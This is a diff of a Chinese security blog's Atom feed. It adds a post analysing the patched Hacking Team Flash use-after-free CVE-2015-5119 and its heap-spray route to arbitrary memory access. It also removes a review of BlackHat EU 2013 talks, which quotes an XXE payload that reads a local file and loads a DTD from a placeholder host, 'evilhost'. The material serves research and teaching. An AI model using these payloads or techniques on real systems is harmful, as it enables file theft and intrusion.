@@ -736,6 +736,47 @@
   </entry>
   
   <entry>
+    <title>Hacking Team 武器库研究（二）：CVE-2015-5119 Flash 0day</title>
+    <link href="http://riusksk.github.io/2015/07/10/Hacking-Team-%E6%AD%A6%E5%99%A8%E5%BA%93%E7%A0%94%E7%A9%B6%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9ACVE-2015-5119-Flash-0day/"/>
+    <id>http://riusksk.github.io/2015/07/10/Hacking-Team-武器库研究（二）：CVE-2015-5119-Flash-0day/</id>
+    <published>2015-07-09T16:00:00.000Z</published>
+    <updated>2016-09-27T09:12:00.000Z</updated>
+    
+    <content type="html">&lt;p&gt;目前 Hacking Team 泄露的Flash 0Day已经修复，官方已提供补丁下载，与此同时Metasploit已经提供有漏洞利用代码。在HT泄露的源码目录里，已经包含有对漏洞的简要分析。&lt;/p&gt;
+&lt;h2 id=&quot;【源码分析】&quot;&gt;&lt;a href=&quot;#【源码分析】&quot; class=&quot;headerlink&quot; title=&quot;【源码分析】&quot;&gt;&lt;/a&gt;&lt;strong&gt;【源码分析】&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;1、在MyClass.TryExp1函数中触发漏洞，先分配一组ByteArray，长度为0xfa0，相当于0x1000大小的内存。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://riusksk.me/media/hackteam02/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;2、设置ByteArray值，在将MyClass类赋值给_ba[3]时，AVM会调用MyClass.valueOf函数试图将MyClass类型其转换成Byte类型。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://riusksk.me/media/hackteam02/2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;3、在valueOf 函数中会重新设置更大长度的ByteArray，导致释放原有的ByteArray内存，再重新分配，但是valueOf函数返回后，依然保持着对已释放内存的引用，从而导致UAF漏洞的发生。紧接着分配一堆0x3f0大小的vector.&lt;uint&gt;对象，以占用已释放的内存，然后返回0x40值给ba[3]，刚好覆盖vector对象头部的长度值，以实现读写任意内存地址。&lt;/uint&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://riusksk.me/media/hackteam02/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;4、后面的代码基本跟第一篇分析文章中介绍一样。再补充下上面调用valueOf转换类型的AVM伪代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;void ByteArray.setObjInternal(int offset, obj)
+{
+    byte* dest = this.getStorage(offset);
+    dest* = toInteger(obj);     // call MyClass.valueOf（）
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将ba[3]的内存存储地址保存到本地定义的目标指针，然后对象类型转换成整数类型并赋值给目标指针，当ByteArray数组长度改变时，它会释放原有ba内存，目标指针就成为悬挂指针。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;目前 Hacking Team 泄露的Flash 0Day已经修复，官方已提供补丁下载，与此同时Metasploit已经提供有漏洞利用代码。在HT泄露的源码目录里，已经包含有对漏洞的简要分析。&lt;/p&gt;
+&lt;h2 id=&quot;【源码分析】&quot;&gt;&lt;a href=&quot;#【源码分析】&quot; cl
+    
+    </summary>
+    
+      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
+    
+    
+      <category term="Hacking Team" scheme="http://riusksk.github.io/tags/Hacking-Team/"/>
+    
+      <category term="Flash" scheme="http://riusksk.github.io/tags/Flash/"/>
+    
+      <category term="0day" scheme="http://riusksk.github.io/tags/0day/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Hacking Team 武器库研究（一）：CVE-2015-0349 Flash ConvolutionFilter UAF</title>
     <link href="http://riusksk.github.io/2015/07/10/Hacking-Team-%E6%AD%A6%E5%99%A8%E5%BA%93%E7%A0%94%E7%A9%B6%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9ACVE-2015-0349-Flash-ConvolutionFilter-UAF/"/>
     <id>http://riusksk.github.io/2015/07/10/Hacking-Team-武器库研究（一）：CVE-2015-0349-Flash-ConvolutionFilter-UAF/</id>
@@ -971,47 +1012,6 @@
     
     
       <category term="CanSecWest" scheme="http://riusksk.github.io/tags/CanSecWest/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>关于BlackHat EU 2013大会</title>
-    <link href="http://riusksk.github.io/2013/03/20/BlackHat-EU-2013/"/>
-    <id>http://riusksk.github.io/2013/03/20/BlackHat-EU-2013/</id>
-    <published>2013-03-19T16:00:00.000Z</published>
-    <updated>2016-06-24T14:24:54.000Z</updated>
-    
-    <content type="html">&lt;p&gt;大会文档下载：&lt;a href=&quot;https://www.blackhat.com/eu-13/archives.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.blackhat.com/eu-13/archives.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;此次BH EU 议题整体较水，涉及系统安全、移动安全、网络传输安全、WEB安全、游戏安全等。下面随便挑几个议题简单介绍下，有些议题不是很感兴趣，有些也特水，有兴趣的自己到上面链接下载文档。&lt;/p&gt;
-&lt;h3 id=&quot;1、《A-PERFECT-CRIME-ONLY-TIME-WILL-TELL》&quot;&gt;&lt;a href=&quot;#1、《A-PERFECT-CRIME-ONLY-TIME-WILL-TELL》&quot; class=&quot;headerlink&quot; title=&quot;1、《A PERFECT CRIME? ONLY TIME WILL TELL》&quot;&gt;&lt;/a&gt;1、《A PERFECT CRIME? ONLY TIME WILL TELL》&lt;/h3&gt;&lt;p&gt;讲述SSL攻击方法——CRIME，如何从SSL加密的会话中获取到cookie，CRIME原理就是通过在受害者的浏览器中运行JavaScript代码并同时监听HTTPS传输数据，进而解密会话Cookie，也算是中间人攻击MIMT的一种方法。该议题对&lt;code&gt;CRIME&lt;/code&gt;方法进行扩展，介绍一种叫&lt;code&gt;TIME (Timing Info-leak MadeEasy)&lt;/code&gt;的攻击手法，基于传输时间来猜测payload size，然后逐字猜解cookie。&lt;/p&gt;
-&lt;h3 id=&quot;2、《ADVANCED-HEAP-MANIPULATION-IN-WINDOWS-8》&quot;&gt;&lt;a href=&quot;#2、《ADVANCED-HEAP-MANIPULATION-IN-WINDOWS-8》&quot; class=&quot;headerlink&quot; title=&quot;2、《ADVANCED HEAP MANIPULATION IN WINDOWS 8》&quot;&gt;&lt;/a&gt;2、《ADVANCED HEAP MANIPULATION IN WINDOWS 8》&lt;/h3&gt;&lt;p&gt;介绍常堆及内核溢出利用技巧，以及在win8上改进后的内存安全保护机制。里面构造堆内存布局的exploit技巧，与以往利用信息泄露获取dll基址来绕过ASLR方法有些类似，都通过分配特定大小的堆块，然后释放出与造成溢出的堆块大小相同的堆块，触发漏洞后覆盖到特定结构。同时，介绍了内核中的堆块分配与释放的原理，然后讲述不同大小的堆块溢出后，如何构造相应的堆布局来实现利用。最后，以windows object内核漏洞为例，讲述win7\win8上的exploit技巧，在wihte paper中已给出相应的exploit代码。&lt;/p&gt;
-&lt;h3 id=&quot;3、《THE-DEPUTIES-ARE-STILL-CONFUSED》&quot;&gt;&lt;a href=&quot;#3、《THE-DEPUTIES-ARE-STILL-CONFUSED》&quot; class=&quot;headerlink&quot; title=&quot;3、《THE DEPUTIES ARE STILL CONFUSED》&quot;&gt;&lt;/a&gt;3、《THE DEPUTIES ARE STILL CONFUSED》&lt;/h3&gt;&lt;p&gt;总之，这议题很水，爱看不看。主要讲CSRF和点击劫持&lt;code&gt;clickjacking&lt;/code&gt;的攻击技巧，里面也提到前段时间facebook爆出的OAuth2认证漏洞，点击劫持就讲下beef的&lt;code&gt;clickjacking&lt;/code&gt;模块，然后提下防御点击劫持的&lt;code&gt;x-frame-options&lt;/code&gt;。&lt;/p&gt;
-&lt;h3 id=&quot;4、《Hacking-Appliances-Ironic-exploits-in-security-products》&quot;&gt;&lt;a href=&quot;#4、《Hacking-Appliances-Ironic-exploits-in-security-products》&quot; class=&quot;headerlink&quot; title=&quot;4、《Hacking Appliances: Ironic exploits in security products》&quot;&gt;&lt;/a&gt;4、《Hacking Appliances: Ironic exploits in security products》&lt;/h3&gt;&lt;p&gt;初看这标题，还以为是讲客户端软件漏洞利用呢，其实主要还是讲WEB安全的多一些，觉得有点水。&lt;/p&gt;
-&lt;h3 id=&quot;5、《HACKING-VIDEO-CONFERENCING-SYSTEMS》&quot;&gt;&lt;a href=&quot;#5、《HACKING-VIDEO-CONFERENCING-SYSTEMS》&quot; class=&quot;headerlink&quot; title=&quot;5、《HACKING VIDEO CONFERENCING SYSTEMS》&quot;&gt;&lt;/a&gt;5、《HACKING VIDEO CONFERENCING SYSTEMS》&lt;/h3&gt;&lt;p&gt;比较有趣的一个议题，主要讲述如何攻击语音会议系统，介绍了root提权以及远程调试的一些技巧，最后演示了一个后门shell。对这些不是很了解，有兴趣的自己看文档。&lt;/p&gt;
-&lt;h3 id=&quot;6、《Hardening-your-Windows-8-apps-for-the-Windows-Store》&quot;&gt;&lt;a href=&quot;#6、《Hardening-your-Windows-8-apps-for-the-Windows-Store》&quot; class=&quot;headerlink&quot; title=&quot;6、《Hardening your Windows 8 apps for the Windows Store》&quot;&gt;&lt;/a&gt;6、《Hardening your Windows 8 apps for the Windows Store》&lt;/h3&gt;&lt;p&gt;很水，不解释&lt;/p&gt;
-&lt;h3 id=&quot;7、《Harnessing-GP²Us-Building-Better-Browser-Based-Botnets》&quot;&gt;&lt;a href=&quot;#7、《Harnessing-GP²Us-Building-Better-Browser-Based-Botnets》&quot; class=&quot;headerlink&quot; title=&quot;7、《Harnessing GP²Us Building Better Browser Based Botnets》&quot;&gt;&lt;/a&gt;7、《Harnessing GP²Us Building Better Browser Based Botnets》&lt;/h3&gt;&lt;p&gt;觉得这议题有点在玩概念，实际攻击场景或者实战的东西很少，太理论化了。GPU现在很多被用在暴力破解方面，比如跑MD5、跑WPA-PSK，速度比CPU快得N多，比五速鞋还五速鞋……该议题主要讲构造基于浏览器的僵尸网络botnet，利用WEB漏洞（如XSS，并提到利用html5的WEB存储特性、插件等等方法实现永久XSS）来执行代码，再用GPU跑数据，然后利用C&amp;amp;C服务器进行通讯。&lt;/p&gt;
-&lt;h3 id=&quot;8、《LET’S-PLAY-APPLANTING》&quot;&gt;&lt;a href=&quot;#8、《LET’S-PLAY-APPLANTING》&quot; class=&quot;headerlink&quot; title=&quot;8、《LET’S PLAY - APPLANTING》&quot;&gt;&lt;/a&gt;8、《LET’S PLAY - APPLANTING》&lt;/h3&gt;&lt;p&gt;很水，为什么这种也能上BH大会讲呢&lt;/p&gt;
-&lt;h3 id=&quot;9、《MULTIPLAYER-ONLINE-GAMES-INSECURITY》&quot;&gt;&lt;a href=&quot;#9、《MULTIPLAYER-ONLINE-GAMES-INSECURITY》&quot; class=&quot;headerlink&quot; title=&quot;9、《MULTIPLAYER ONLINE GAMES INSECURITY》&quot;&gt;&lt;/a&gt;9、《MULTIPLAYER ONLINE GAMES INSECURITY》&lt;/h3&gt;&lt;p&gt;讲游戏漏洞相关的，主要涉及协议分析、常见客户端漏洞攻击等，没什么新鲜的东西，爱看不看。&lt;/p&gt;
-&lt;h3 id=&quot;10、《Next-generation-mobile-rootkits》&quot;&gt;&lt;a href=&quot;#10、《Next-generation-mobile-rootkits》&quot; class=&quot;headerlink&quot; title=&quot;10、《Next generation mobile rootkits》&quot;&gt;&lt;/a&gt;10、《Next generation mobile rootkits》&lt;/h3&gt;&lt;p&gt;相对比较前沿的东西，主要讲arm平台上的rookit设计，但PPT写得太简洁了，简单一些文本描述，很难完全理解其中意思。之前viaForensics也写一篇关于android rootkit的文档《Dude,where’s my droid?!》，发表于RootedCON 2013安全大会，推荐阅读。&lt;/p&gt;
-&lt;h3 id=&quot;11、《POWER-ANALYSIS-ATTACKS-FOR-CHEAPSKATES》&quot;&gt;&lt;a href=&quot;#11、《POWER-ANALYSIS-ATTACKS-FOR-CHEAPSKATES》&quot; class=&quot;headerlink&quot; title=&quot;11、《POWER ANALYSIS ATTACKS FOR CHEAPSKATES》&quot;&gt;&lt;/a&gt;11、《POWER ANALYSIS ATTACKS FOR CHEAPSKATES》&lt;/h3&gt;&lt;p&gt;可能一些搞硬件hacking或者移动安全的朋友会感兴趣，应该属于边信道攻击一类，玩这种都需要花钱买设备，所以搞这些的一般都是高富帅，像kevin2600一样。&lt;/p&gt;
-&lt;h3 id=&quot;12、《XML-Out-Of-Band-Data-Retrieval》&quot;&gt;&lt;a href=&quot;#12、《XML-Out-Of-Band-Data-Retrieval》&quot; class=&quot;headerlink&quot; title=&quot;12、《XML Out-Of-Band Data Retrieval》&quot;&gt;&lt;/a&gt;12、《XML Out-Of-Band Data Retrieval》&lt;/h3&gt;&lt;p&gt;这种XML实体注入漏洞，在2011年的时候，80sec就有写过一篇文章提到《XML实体注入漏洞安全警告》&lt;a href=&quot;http://www.80sec.com/xml-entity-injection.html，比如可用于读取文件，加载远程页面：&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.80sec.com/xml-entity-injection.html，比如可用于读取文件，加载远程页面：&lt;/a&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;!ENTITY % payload SYSTEM &amp;quot;file:///c:/boot.ini&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://evilhost/evil.xml&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;漏洞实例见《zend framework文件读取漏洞分析》：&lt;a href=&quot;http://zone.wooyun.org/content/508&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://zone.wooyun.org/content/508&lt;/a&gt; ，不过最早是在2002年的时候老外就有提出过这个问题。&lt;/p&gt;
-&lt;h3 id=&quot;13、《Advanced-iOS-Application-Pentesting》&quot;&gt;&lt;a href=&quot;#13、《Advanced-iOS-Application-Pentesting》&quot; class=&quot;headerlink&quot; title=&quot;13、《Advanced iOS Application Pentesting》&quot;&gt;&lt;/a&gt;13、《Advanced iOS Application Pentesting》&lt;/h3&gt;&lt;p&gt;看标题冒似很“高级”的样子，实则就介绍下ios的一些逆向工具和ios编程中用到的一些类而已，还是爱看不看。&lt;/p&gt;
-&lt;h3 id=&quot;14、《APPLICATION-DEVELOPMENT-SECURE-CODING-WORKSHOP》&quot;&gt;&lt;a href=&quot;#14、《APPLICATION-DEVELOPMENT-SECURE-CODING-WORKSHOP》&quot; class=&quot;headerlink&quot; title=&quot;14、《APPLICATION DEVELOPMENT SECURE CODING WORKSHOP》&quot;&gt;&lt;/a&gt;14、《APPLICATION DEVELOPMENT SECURE CODING WORKSHOP》&lt;/h3&gt;&lt;p&gt;主要讲WEB开发中安全编程，但主要就是在普及WEB安全漏洞的原理、防御等，包括XSS、注入、CSRF等等，算是总结性文章，没有新货，有兴趣的自个翻看下。&lt;/p&gt;
-&lt;h3 id=&quot;15、《Assessing-BYOD-with-the-Smarthpone-Pentest-Framework》&quot;&gt;&lt;a href=&quot;#15、《Assessing-BYOD-with-the-Smarthpone-Pentest-Framework》&quot; class=&quot;headerlink&quot; title=&quot;15、《Assessing BYOD with the Smarthpone Pentest Framework》&quot;&gt;&lt;/a&gt;15、《Assessing BYOD with the Smarthpone Pentest Framework》&lt;/h3&gt;&lt;p&gt;作者公布了一款智能机渗透测试框架——Smartphone Pentest Framework v0.1.5，包括一些浏览器漏洞、客户端漏洞、社会工程学漏洞以及本地提权等，利用漏洞获取shell后还可发送短信、获取通信录、短信、下载上传文件等，有些功能还是不错的，但漏洞利用方法相对单一，有其利用的局限性。该工具下载地址：&lt;br&gt;&lt;a href=&quot;https://github.com/georgiaw/Smartphone-Pentest-Framework&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/georgiaw/Smartphone-Pentest-Framework&lt;/a&gt;&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;大会文档下载：&lt;a href=&quot;https://www.blackhat.com/eu-13/archives.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.blackhat.com/eu-13/archives.html
-    
-    </summary>
-    
-      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
-    
-    
-      <category term="BlackHat" scheme="http://riusksk.github.io/tags/BlackHat/"/>
     
   </entry>
   
